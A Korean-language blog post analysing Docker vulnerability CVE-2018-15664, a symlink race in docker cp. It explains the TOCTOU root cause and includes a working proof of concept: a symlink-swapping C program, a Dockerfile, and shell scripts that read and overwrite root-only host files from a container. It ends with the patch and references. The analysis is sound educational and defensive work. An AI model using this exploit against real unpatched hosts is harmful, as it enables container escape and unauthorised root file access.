---
layout: post
title: "Docker Race Condition(CVE-2018-15664) Analysis"
excerpt: "Try to know CVE-2018-15664"
categories: [system,CVE]
comments: true 
---

이번에는 도커에서 발생한 레이스 컨디션 취약점이다. CVE는  2018-15664이다.

우선 기본적으로 해당 공격을 이해하기 위해선 Race Condition이 뭔지를 알아야 한다. 간단히 짚고 넘어가자. 

<h3>0x0. Race Condition</h3>

한정된 자원(변수, 메모리, 파일 등)을 동시에 여러 프로세스가 이용을 하려고 경쟁하는 현상이다. 이 현상은 프로세스, 스레드의 순서, 타이밍 등에 의해서 발생을 한다. 

이를 이용해서  DoS, 권한 상승 등의 행위가 가능한게 레이스 컨디션 공격이다. 

해당 취약점이 발생하는 다양한 케이스가 존재하나, 대표적으로 TOCTOU, Thread 등이 있다. 

> TOCTOU(Time-of-check Time-of-use)는 해당 취약점에서 다룰 케이스여서 조금 보자면 어떠한 자원을 사용하기 전에 자원의 상태를 먼저 파악하는 로직과 그 후 잠시 뒤에 자원을 사용하는 과정에서 발생하는 취약점이다. 

이는 보편적으로 로지컬 버그이고, 프로세스 및 스레드간의 타이밍 등 상황에 따라 달라지기 때문에 QA를 하기가 어렵다. 그러므로 설계 단계에서 확실하게 처리를 해야 한다. 

<h3>0x1. Intro</h3>

앞서 설명한 레이스 컨디션 취약점을 통해서 도커에서 발생한 취약점이 CVE-2018-15664이다. 해당 취약점은 레이스 컨디션 케이스 중 <span style="color:orange">TOCTOU(Time-of-check Time-of-use)</span>에 의한 취약점 케이스이다. 공격자는 root 권한으로 호스트 파일시스템에 대해 read & write가 가능해진다. 

해당 취약점의 영향을 받는 버전은 Docker Engine 17.06.0-ce ~ 18.06.1-ce 이다. 

<h3>0x2. Vulnerability Root Cause</h3>

취약점이 발생하는 이유를 보면, 우선 `FollowSymlinkInScope` 라는 함수에 의해서 취약점이 발생한다. 해당 함수의 코드를 살펴보면 아래와 같다. 

```python
func FollowSymlinkInScope(path, root string) (string, error) {
	path, err := filepath.Abs(filepath.FromSlash(path))
	if err != nil {
		return "", err
	}
	root, err = filepath.Abs(filepath.FromSlash(root))
	if err != nil {
		return "", err
	}
	return evalSymlinksInScope(path, root)
}
```

 이렇게 path, 즉 경로가 인자로 들어오면 해당 경로가 심볼릭 링크인지 판단하고, 심볼릭 링크라면 최종적으로 가리키는 경로를 반환한다. 당연히 이러한 과정에서 인자나 리턴값이나 도커 내부에 링크를 가리키니 문제가 될 것이 없어보인다. <span style="color:orange">하지만 여기서 취약점이 발생을 하게 되고 그래서 Race condition 취약점이 단편적인 분석으로는 쉽게 발견하기가 어렵다. </span>

이 함수를 이용한 도커의 실행과정에서 주목할 점이 있는데, `FollowSymlinkInScope`함수로 경로를 구하고, <span style="color:orange">잠시 뒤에</span> 구한 경로를 작업에 사용한다는 점이다. 이 <span style="color:orange">"잠시"의 타이밍</span>에 로컬에 위치한 파일을 가리키는 경로로 심볼릭 링크를 걸어준다면 도커는 루트 권한으로 작동을 하기 때문에 컨테이너를 벗어나 호스트의 파일에 접근이 되는 레이스 컨디션 공격이 가능하다.



<h3>0x3. Proof of Concept</h3>

익스를 하기 전에 알고있어야 할 명령어가 있다. 

<h4>Base - Docker cp</h4>

도커에는 `docker cp`라는 명령어가 존재한다. 이는, 도커 컨테이너와 로컬 간의 파일에 대한 복사를 수행해주는 명령어이다. 간단한 예를 들자면 아래와 같이 사용한다.

``` dockerfile
# Container -> Local 
docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|

# Local -> Container
docker cp [OPTIONS] SRC_PATH| CONTAINER:DEST_PATH
```

이 명령어를 수행할 때 실제로는 `CONTAINER:SRC_PATH`의 절대주소가 `DEST_PATH`로 복사되고 반대로 복사할 때도 마찬가지이다.  단 이때 도커는 기본적으로 루트 권한으로 동작하기 때문에 `docker cp`명령어가 파일을 복사할 때 역시 <span style="color:orange">루트 권한으로 진행된다. </span>



<h4>Setting</h4>

이제는 익스플로잇을 위한 환경 세팅을 해보자.  우선 실습을 진행할 도커파일이 필요하다. 

```dockerfile
#우분투 18.04 기반 이미지 
FROM ubuntu:18.04  
# 이미지 구성
RUN apt-get update && apt-get install -y gcc 
# DockerFile과 같은 dir에 있는 symlink_swap.c를 컨테이너에 복사
COPY symlink_swap.c /symlink_swap.c 
# 컨테이너 내부의 symlink_swap.c를 컴파일
RUN gcc -o /symlink_swap /symlink_swap.c
# Entrypoint를 symlink_swap으로 설정
ENTRYPOINT ["/symlink_swap"]
```

다음으로 취약한 코드인 `symlink_swap.c`를 아래와 같이 만들자. 

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>
#include <fcntl.h>

int main()
{
	symlink("/", "/totally_safe_path"); // root dir에 /totally_safe_path를 심볼릭 링크 연결
	mkdir("/totally_safe_path-stashed", 0755); //dir 생성

	while (1) //계속 반복
		renameat2(AT_FDCWD, "/totally_safe_path", AT_FDCWD, "/totally_safe_path-stashed", RENAME_EXCHANGE);// 이름교환

	return 0;
}
```

간단히 코드를 분석해보면, `/totally_safe_path` 가 `/` 에 링크되고 `/totally_safe_path-stashed` 라는 이름의 디렉토리를 만든 상태에서 `/totally_safe_path` 와 `/totally_safe_path-stashed` 간 이름 교환하기를 무한히 반복한다. 

```dockerfile
# A, totally_safe_path가 /를 가르키면서 루트 권한을 갖는다. 
lrwxrwxrwx  totally_safe_path -> / 
drwxr-xr-x  totally_safe_path-stashed

# B, totally_safe_path-stashed가 /를 가르키면서 루트 권한을 갖는다. 
drwxr-xr-x  totally_safe_path
lrwxrwxrwx  totally_safe_path-stashed -> /
```

이렇게 작동 한다. 이를 좀 더 직관적으로 보면 아래 이미지와 같다. 

![image-20230102181340481](C:\Users\kangs\AppData\Roaming\Typora\typora-user-images\image-20230102181340481.png)

최종적으로 이렇게 1번과 2번이 차례대로 계속해서 교차반복 되는 것이다. 



<h4>Exploit - Arbitrary File Read</h4>

이제는 파일 읽기를 먼저 해보자.  

```sh
$ echo "Copy SUCCESS!" | sudo tee /flag
Copy SUCCESS!
$ cat /flag
Copy SUCCESS!
$ sudo chmod 000 /flag
$ cat /flag
cat: /flag: Permission denied
```

위의 과정은 호스트 로컬에` /flag `파일에 Copy SUCCESS!를 작성해두고 이 파일을 읽어보는 예시다. 일반적으로라면 당연히 도커 컨테이너 내부에서는 이 `/flag`파일을 읽지 못한다. 

이제 공격 코드를 살펴보자. 아래 코드는 `read.sh` 이다. 

```sh
#!/bin/sh

# dockerfile과 symlin_swap.c로 poc라는 이름의 이미지를 생성 및 도커 컨테이너 실행
docker build -t poc .
container_id=$(docker run --rm -d poc)

# 이제 계속 파일을 복사하기 위한 공격 시도
i=0
while [ $i -lt 500 ]
do
	mkdir "ex${i}"
	#이게 핵심.. 컨테이너에 위치한 /totally_safe_path/flag 파일을 호스트 로컬의 ex${i}/out으로 복사하는 명령어. 성공한다면 해당 파일에 /totally_safe_path/flag의 내용인, Copy SUCCESS!가 적힐 것이다. 
	docker cp "${container_id}:/totally_safe_path/flag" "ex${i}/out"
	i=$(($i + 1))
done
chmod 0644 ex*/out
```

코드를 설명해보면, 밑에 파일을 복사해서 읽기 위한 `docker cp`명령어를 500번을 수행한다. 현재 컨테이너 내부에서는` symlink_swap.c`가 계속 돌아가는 중이기 때문에 이를 통해서 파일 읽기가 가능하다.  

여기서부터가 좀 중요하다. 현재 위에서 언급한 상태 중, B 상태라고 생각을 해보자. 

```dockerfile
# B, totally_safe_path-stashed가 /를 가르키면서 루트 권한을 갖는다. 
drwxr-xr-x  totally_safe_path
lrwxrwxrwx  totally_safe_path-stashed -> /
```

해당 상황에서는 컨테이너 내부 경로인 `/totally_safe_path/flag` 가 `FollowSymlinkInScope` 함수에 인자로 전달되면 심볼릭 링크가 없는 인자이기 때문에 절대경로인`/var/lib/docker/overlay2/CONTAINER_ID/merged/totally_safe_path/flag` 가 반환된다. 그런데 만일 해당 함수의 동작이 끝나고, `/var/lib/docker/overlay2/CONTAINER_ID/merged/totally_safe_path/flag` 를 `ex${i}/out` 로 복사하려는 그 순간의 바로 직전에 A 상태가 된다면,, 취약점이 발생하는 것이다. 

```dockerfile
# A, 컨테이너 내부를 심볼릭 링크한다. 
lrwxrwxrwx  totally_safe_path -> /
drwxr-xr-x  totally_safe_path-stashed

# A로 변한 B, 호스트 로컬의 파일을 볼 수 있다. 
lrwxrwxrwx  /var/lib/docker/overlay2/CONTAINER_ID/merged/totally_safe_path -> /
drwxr-xr-x  /var/lib/docker/overlay2/CONTAINER_ID/merged/totally_safe_path-stashed
```

`/var/lib/docker/overlay2/CONTAINER_ID/merged/totally_safe_path` 가 현재 루트 dir인`/` 에 심볼릭 링크되어 있는 상태니까 실제로 수행되는 것은 `/flag` 가 루트 권한으로`ex${i}/out` 로 복사된다.  결론적으로는 읽기 권한이 없는 호스트 로컬의 `/flag` 의 내용을 읽을 수 있게 된다.  

직관적으로 표현하면 아래 그림과 같다.

![image-20230102192128990](C:\Users\kangs\AppData\Roaming\Typora\typora-user-images\image-20230102192128990.png)

도커 컨테이너 내부에 위치한 /flag파일을 로컬로 읽어드린다. 



<h4>Exploit - Arbitrary File Write</h4>

이번에는 파일에 글을 작성해보자. 원리는 동일하다. 

```shell
$ echo "Host File Unchanged" | sudo tee /flag
Host File Unchanged
$ sudo chmod 0444 /flag
$ echo "Host File Changed" > /flag 
bash: /flag: Permission denied
```

이번의 목표는 호스트 로컬의 파일인 `/flag`에 Host File Unchanged를 적는 것이다. 

이번에는 write.sh를 보자.

```sh
#!/bin/sh

# dockerfile과 symlin_swap.c로 poc라는 이름의 이미지를 생성 및 도커 컨테이너 실행
docker build -t poc .
container_id=$(docker run --rm -d poc)

echo "Host File Changed" > localpath

# 이제 계속 파일을 작성하기 위한 공격 시도
i=0
while [ $i -lt 500 ]
do
# 이게 핵심.. 로컬에 위치한 파일을 컨테이너 내부의  /totally_safe_path/flag으로 복사하는 명령어. 성공한다면 해당 파일에 로컬 파일의 내용인, Host File Changed가 적힐 것이다.
	docker cp localpath "${container_id}:/totally_safe_path/flag"
	i=$(($i + 1))
done
```

`read.sh`에서는 도커 컨테이너 -> 로컬 호스트로 복사를 했다면, 이번에는 호스트 -> 도커 컨테이너로 글을 복사한다. 

이번에도 B상태로 `FollowSymlinkInScope` 함수가 수행되고, 복사가 일어나기 직전에 A 상태가 된다면 레이스 컨디션 공격에 성공한다. 직관적으로 보면 아래와 같다. 

![image-20230102192011390](C:\Users\kangs\AppData\Roaming\Typora\typora-user-images\image-20230102192011390.png)

호스트 로컬에 존재하는 파일인 `/flag`를 도커 컨테이너 내부의 심볼릭 링크를 통해 작성한다. 



<h3>0x4. Patch</h3>

패치가 되었는데, 뭔가 이상하게 패치가 되었다. 패치의 풀 리퀘스트 링크는 다음과 같다. 

(https://github.com/moby/moby/pull/39292)  내용을 좀 살펴보면, 패치 전에는 `docker cp` 명령을 사용할 때에는 복사할 파일/폴더를 tar 압축 후 `dest_path`에서 `untar`한다. 이게 패치가 적용되며, `docker cp`에서` tar, untar` 명령을 수행하는 과정에서 컨테이너 내부의 `root dir`로 `chroot `한 채로 복사를 하도록 컨테이너 루트의 상위 디렉터리로 연결된 심볼릭 링크가 불가능하도록 했다. 

이상하게 패치가 되었다는 말을 한 이유는, 이 패치로 인해서 더 심각한 도커 컨테이너 제일 브레이크 취약점인 CVE-2019-14271이 발견되었기 때문이다. 이는 다음에 이스케이프, 제일 브레이크 원데이를 다룰때 다뤄보도록 하겠다. 

<h3>0x5. Reference</h3>

이 글을 작성하면서 참고한 레퍼런스다. 아마 혼자 분석을 했다면 훨신 어려웠을 것 같은데 늘 고마운 분들께 도움을 받는다. 

* https://core-research-team.github.io/2021-04-01/Docker-Race-Condition-Vulnerability-CVE-2018-15664 Thanks to 이동현(http://donghyunlee.me/)

* https://velog.io/@groompang/CVE-2018-15664 

* https://www.lazenca.net/display/TEC/09.Race+condition
* https://bugzilla.suse.com/show_bug.cgi?id=1096726

